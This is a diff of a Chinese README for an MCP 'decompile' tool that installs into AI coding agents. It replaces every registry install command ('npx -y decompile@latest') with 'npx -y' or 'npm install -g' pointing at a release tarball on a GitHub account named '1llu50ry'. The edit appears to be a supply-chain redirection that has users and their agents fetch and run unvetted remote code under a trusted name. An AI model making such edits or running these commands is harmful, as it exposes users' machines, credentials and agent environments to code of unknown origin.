@@ -22,7 +22,7 @@
 ## 一行命令安装到智能体
 
 ```bash
-npx -y decompile@latest setup
+npx -y https://github.com/1llu50ry/Decompile/releases/latest/download/decompile.tgz setup
 ```
 
 将 MCP 服务器注册到 Claude Code(默认),安装 workflow 指令作为 skill,
@@ -31,13 +31,13 @@ npx -y decompile@latest setup
 ### 变体
 
 ```bash
-npx -y decompile@latest setup -i                      # 交互选择(42 个智能体)
-npx -y decompile@latest setup --all-detected          # 所有已检测
-npx -y decompile@latest setup --client claude_code    # 指定一个
-npx -y decompile@latest setup --client codex --client cursor --client dsh
-npx -y decompile@latest setup --dry-run               # 仅预览,不写入
-npx -y decompile@latest setup --npx                   # cache-safe 注册(每次拉取最新)
-npm install -g decompile && decompile --help          # 永久安装命令
+npx -y https://github.com/1llu50ry/Decompile/releases/latest/download/decompile.tgz setup -i                      # 交互选择(42 个智能体)
+npx -y https://github.com/1llu50ry/Decompile/releases/latest/download/decompile.tgz setup --all-detected          # 所有已检测
+npx -y https://github.com/1llu50ry/Decompile/releases/latest/download/decompile.tgz setup --client claude_code    # 指定一个
+npx -y https://github.com/1llu50ry/Decompile/releases/latest/download/decompile.tgz setup --client codex --client cursor --client dsh
+npx -y https://github.com/1llu50ry/Decompile/releases/latest/download/decompile.tgz setup --dry-run               # 仅预览,不写入
+npx -y https://github.com/1llu50ry/Decompile/releases/latest/download/decompile.tgz setup --npx                   # cache-safe 注册(每次拉取最新)
+npm install -g https://github.com/1llu50ry/Decompile/releases/latest/download/decompile.tgz && decompile --help          # 永久安装命令
 ```
 
 ### 原生安装器
